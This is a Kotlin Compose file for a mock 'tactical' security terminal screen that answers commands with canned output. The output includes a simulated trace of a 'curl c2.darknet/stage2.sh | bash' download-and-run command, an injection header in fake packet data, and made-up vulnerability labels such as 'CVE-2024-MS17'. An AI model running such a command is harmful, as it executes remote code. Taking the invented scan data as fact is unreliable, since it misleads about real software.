package com.example.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.hapticfeedback.HapticFeedbackType
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.ui.theme.*
import kotlinx.coroutines.launch

data class TerminalLogLine(
  val content: String,
  val type: TerminalLineType = TerminalLineType.OUTPUT,
  val timestamp: String = "02:15:42"
)

enum class TerminalLineType {
  COMMAND,
  OUTPUT,
  SUCCESS,
  WARNING,
  ERROR,
  BANNER
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CyberTerminalScreen(
  onNavigateBack: () -> Unit,
  modifier: Modifier = Modifier
) {
  val haptic = LocalHapticFeedback.current
  val coroutineScope = rememberCoroutineScope()
  val listState = rememberLazyListState()
  var inputCommand by remember { mutableStateOf("") }
  val commandHistory = remember { mutableStateListOf<String>() }
  var historyIndex by remember { mutableIntStateOf(-1) }

  val terminalLogs = remember {
    mutableStateListOf(
      TerminalLogLine(
        "╔═════════════════════════════════════════════════════════════════╗\n" +
        "║  AEGORA TACTICAL OPERATOR SHELL v4.8.2-SEC                     ║\n" +
        "║  Sandboxed eBPF Kernel Node: microvm-node-8a21                 ║\n" +
        "║  Target Subnet: 192.168.1.0/24 (DEF CON CTF Range)              ║\n" +
        "╚═════════════════════════════════════════════════════════════════╝",
        TerminalLineType.BANNER
      ),
      TerminalLogLine("Type 'help' or tap quick-command chips below to execute tactical toolchains.", TerminalLineType.OUTPUT)
    )
  }

  fun executeCommand(rawCmd: String) {
    val cmd = rawCmd.trim()
    if (cmd.isBlank()) return

    haptic.performHapticFeedback(HapticFeedbackType.LongPress)
    terminalLogs.add(TerminalLogLine("root@aegora-node:~# $cmd", TerminalLineType.COMMAND))
    commandHistory.add(cmd)
    historyIndex = commandHistory.size

    when {
      cmd == "help" -> {
        terminalLogs.add(
          TerminalLogLine(
            "Available Tactical Commands:\n" +
            "  • nmap -sV 192.168.1.0/24         : Port & Service Banner Recon\n" +
            "  • tshark -r capture.pcap -Y http : Decode HTTP Packet Stream\n" +
            "  • yara rule.yar /bin/suspicious  : Scan Binary Heuristic Signatures\n" +
            "  • isolate-node --host win-dc-01   : Subnet Quarantine via eBPF XDP\n" +
            "  • cat /var/log/auth.log | grep Failed : Filter Auth Brute-Force\n" +
            "  • sigma test -r rule.yml -t sysmon : Test Detection Rule Precision\n" +
            "  • ebpf trace syscalls             : Live Kernel Probe Telemetry\n" +
            "  • clear                           : Clear Terminal Screen",
            TerminalLineType.OUTPUT
          )
        )
      }

      cmd == "clear" -> {
        terminalLogs.clear()
        terminalLogs.add(TerminalLogLine("Terminal screen cleared. Sandboxed shell active.", TerminalLineType.OUTPUT))
      }

      cmd.startsWith("nmap") -> {
        terminalLogs.add(TerminalLogLine("Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-26 02:16 UTC", TerminalLineType.OUTPUT))
        terminalLogs.add(
          TerminalLogLine(
            "Nmap scan report for 192.168.1.45 (win-dc-01.corp.internal)\n" +
            "Host is up (0.00042s latency).\n" +
            "PORT     STATE SERVICE       VERSION\n" +
            "22/tcp   open  ssh           OpenSSH 9.2p1 Debian\n" +
            "80/tcp   open  http          Apache httpd 2.4.56 ((Debian))\n" +
            "445/tcp  open  microsoft-ds  Samba smbd 4.17.12 (VULN: CVE-2024-MS17)\n" +
            "3389/tcp open  ms-wbt-server Microsoft Terminal Services\n" +
            "8080/tcp open  http-proxy    MOVEit Transfer API v14.0 (EXPLOITABLE)",
            TerminalLineType.SUCCESS
          )
        )
      }

      cmd.startsWith("tshark") -> {
        terminalLogs.add(
          TerminalLogLine(
            "1   0.000000 192.168.1.102 -> 192.168.1.45 HTTP GET /api/v1/session_auth HTTP/1.1\n" +
            "2   0.000412 192.168.1.45 -> 192.168.1.102 HTTP HTTP/1.1 200 OK (application/json)\n" +
            "3   0.012940 10.0.4.99    -> 192.168.1.45 HTTP POST /moveitisapi.dll?action=m2 (X-siLock: admin'--)\n" +
            "4   0.013100 192.168.1.45 -> 10.0.4.99    HTTP HTTP/1.1 500 Internal Server Error [WEBSHELL INJECTED]",
            TerminalLineType.WARNING
          )
        )
      }

      cmd.startsWith("yara") -> {
        terminalLogs.add(
          TerminalLogLine(
            "Scanning target file /bin/suspicious against rule.yar...\n" +
            "[MATCH] Backdoor_XZ_Utils_liblzma [0x464c457f, offset 0x1124f]\n" +
            "[MATCH] Heuristic_IFUNC_Hijack (Severity: CRITICAL)\n" +
            "[!] Target payload contains weaponized ELF decryption stub.",
            TerminalLineType.ERROR
          )
        )
      }

      cmd.startsWith("isolate-node") -> {
        terminalLogs.add(
          TerminalLogLine(
            "[+] eBPF XDP Filter applied to veth_dc01.\n" +
            "[+] Dropping all ingress/egress TCP/UDP traffic to 192.168.1.45.\n" +
            "[✓] Subnet containment confirmed. Lateral movement halted.",
            TerminalLineType.SUCCESS
          )
        )
      }

      cmd.contains("auth.log") -> {
        terminalLogs.add(
          TerminalLogLine(
            "Aug 26 02:14:10 dc01 sshd[4912]: Failed password for invalid user admin from 185.220.101.5 port 44102 ssh2\n" +
            "Aug 26 02:14:12 dc01 sshd[4914]: Failed password for invalid user root from 185.220.101.5 port 44108 ssh2\n" +
            "Aug 26 02:14:15 dc01 sshd[4918]: Accepted publickey for operator from 10.0.1.5 port 51220 ssh2: RSA SHA256:8F92...B14A",
            TerminalLineType.WARNING
          )
        )
      }

      cmd.startsWith("sigma test") -> {
        terminalLogs.add(
          TerminalLogLine(
            "Compiling Sigma rule against 14,200 Sysmon telemetry events...\n" +
            "Rule: Suspicious_PowerShell_IEX_Download\n" +
            "• True Positives: 3 (100% precision)\n" +
            "• False Positives: 0 (0.0% noise)\n" +
            "[✓] Rule validated and approved for SIEM deployment.",
            TerminalLineType.SUCCESS
          )
        )
      }

      cmd.startsWith("ebpf") -> {
        terminalLogs.add(
          TerminalLogLine(
            "Tracing kernel sys_enter_execve probes (Cilium eBPF)...\n" +
            "PID: 8192 | PPID: 1042 | COMM: sshd       | PATH: /bin/sh -c 'curl c2.darknet/stage2.sh | bash'\n" +
            "PID: 8194 | PPID: 8192 | COMM: curl       | ADDR: 198.51.100.24:443 (C2 IP Detected)\n" +
            "[!] Kernel hook triggered alerts on suspicious process lineage.",
            TerminalLineType.ERROR
          )
        )
      }

      cmd == "whoami" -> {
        terminalLogs.add(TerminalLogLine("root (uid=0 gid=0 groups=0(root),27(sudo))", TerminalLineType.OUTPUT))
      }

      else -> {
        terminalLogs.add(TerminalLogLine("sh: command not found: $cmd. Type 'help' for command list.", TerminalLineType.ERROR))
      }
    }

    inputCommand = ""
    coroutineScope.launch {
      listState.animateScrollToItem(terminalLogs.size - 1)
    }
  }

  val commandChips = listOf(
    "nmap -sV 192.168.1.0/24",
    "tshark -r capture.pcap -Y http",
    "yara rule.yar /bin/suspicious",
    "isolate-node --host win-dc-01",
    "cat /var/log/auth.log | grep Failed",
    "sigma test -r rule.yml -t sysmon",
    "ebpf trace syscalls"
  )

  Scaffold(
    topBar = {
      TopAppBar(
        title = {
          Row(verticalAlignment = Alignment.CenterVertically) {
            Box(
              modifier = Modifier
                .size(32.dp)
                .clip(RoundedCornerShape(6.dp))
                .background(NeonGreen.copy(alpha = 0.15f))
                .border(1.dp, NeonGreen, RoundedCornerShape(6.dp)),
              contentAlignment = Alignment.Center
            ) {
              Icon(Icons.Default.Terminal, contentDescription = null, tint = NeonGreen, modifier = Modifier.size(18.dp))
            }
            Spacer(modifier = Modifier.width(10.dp))
            Column {
              Text(
                "TACTICAL CLI TERMINAL",
                style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace),
                color = TextPrimaryDark
              )
              Text(
                "eBPF Sandboxed Host • root@aegora-node",
                style = MaterialTheme.typography.labelSmall.copy(fontSize = 10.sp),
                color = CyberEmerald
              )
            }
          }
        },
        navigationIcon = {
          IconButton(onClick = onNavigateBack) {
            Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextPrimaryDark)
          }
        },
        actions = {
          IconButton(onClick = { executeCommand("clear") }) {
            Icon(Icons.Default.DeleteOutline, contentDescription = "Clear", tint = TextSecondaryDark)
          }
        },
        colors = TopAppBarDefaults.topAppBarColors(containerColor = CyberDarkSlate)
      )
    },
    containerColor = CyberBlack
  ) { innerPadding ->
    Column(
      modifier = modifier
        .fillMaxSize()
        .padding(innerPadding)
        .background(CyberBlack)
    ) {
      // Quick Command Chips Bar
      Row(
        modifier = Modifier
          .fillMaxWidth()
          .background(CyberDarkSlate)
          .horizontalScroll(rememberScrollState())
          .padding(horizontal = 10.dp, vertical = 6.dp),
        horizontalArrangement = Arrangement.spacedBy(6.dp)
      ) {
        commandChips.forEach { chip ->
          Surface(
            shape = RoundedCornerShape(6.dp),
            color = CyberCardBg,
            border = androidx.compose.foundation.BorderStroke(1.dp, CyberBorder),
            modifier = Modifier.clickable {
              inputCommand = chip
              executeCommand(chip)
            }
          ) {
            Text(
              text = chip,
              style = MaterialTheme.typography.labelSmall.copy(
                fontFamily = FontFamily.Monospace,
                fontSize = 10.sp
              ),
              color = CyberCyan,
              modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
            )
          }
        }
      }

      // Terminal Output Window
      LazyColumn(
        state = listState,
        modifier = Modifier
          .fillMaxWidth()
          .weight(1f)
          .padding(12.dp),
        verticalArrangement = Arrangement.spacedBy(4.dp)
      ) {
        items(terminalLogs) { log ->
          val textColor = when (log.type) {
            TerminalLineType.COMMAND -> NeonCyan
            TerminalLineType.BANNER -> CyberAmber
            TerminalLineType.SUCCESS -> CyberEmerald
            TerminalLineType.WARNING -> TerminalAmber
            TerminalLineType.ERROR -> NeonCrimson
            TerminalLineType.OUTPUT -> TextPrimaryDark
          }

          Text(
            text = log.content,
            style = MaterialTheme.typography.labelSmall.copy(
              fontFamily = FontFamily.Monospace,
              fontSize = 11.sp,
              lineHeight = 15.sp,
              fontWeight = if (log.type == TerminalLineType.COMMAND) FontWeight.Bold else FontWeight.Normal
            ),
            color = textColor
          )
        }
      }

      // Command Prompt Input Bar
      Surface(
        color = CyberDarkSlate,
        border = androidx.compose.foundation.BorderStroke(1.dp, CyberBorder),
        modifier = Modifier.fillMaxWidth()
      ) {
        Row(
          modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 8.dp, vertical = 6.dp),
          verticalAlignment = Alignment.CenterVertically
        ) {
          Text(
            "root@aegora:~# ",
            style = MaterialTheme.typography.labelSmall.copy(
              fontFamily = FontFamily.Monospace,
              fontWeight = FontWeight.Bold
            ),
            color = CyberEmerald
          )

          TextField(
            value = inputCommand,
            onValueChange = { inputCommand = it },
            placeholder = {
              Text("Enter tactical command...", style = MaterialTheme.typography.labelSmall.copy(fontFamily = FontFamily.Monospace), color = TextTertiaryDark)
            },
            singleLine = true,
            keyboardOptions = KeyboardOptions(imeAction = ImeAction.Send),
            keyboardActions = KeyboardActions(onSend = { executeCommand(inputCommand) }),
            colors = TextFieldDefaults.colors(
              focusedContainerColor = Color.Transparent,
              unfocusedContainerColor = Color.Transparent,
              focusedTextColor = TextPrimaryDark,
              unfocusedTextColor = TextPrimaryDark,
              focusedIndicatorColor = Color.Transparent,
              unfocusedIndicatorColor = Color.Transparent
            ),
            textStyle = MaterialTheme.typography.labelSmall.copy(
              fontFamily = FontFamily.Monospace,
              fontSize = 12.sp
            ),
            modifier = Modifier
              .weight(1f)
              .testTag("terminal_input_field")
          )

          IconButton(
            onClick = { executeCommand(inputCommand) },
            modifier = Modifier.testTag("terminal_send_btn")
          ) {
            Icon(Icons.Default.Send, contentDescription = "Execute", tint = NeonCyan, modifier = Modifier.size(20.dp))
          }
        }
      }
    }
  }
}
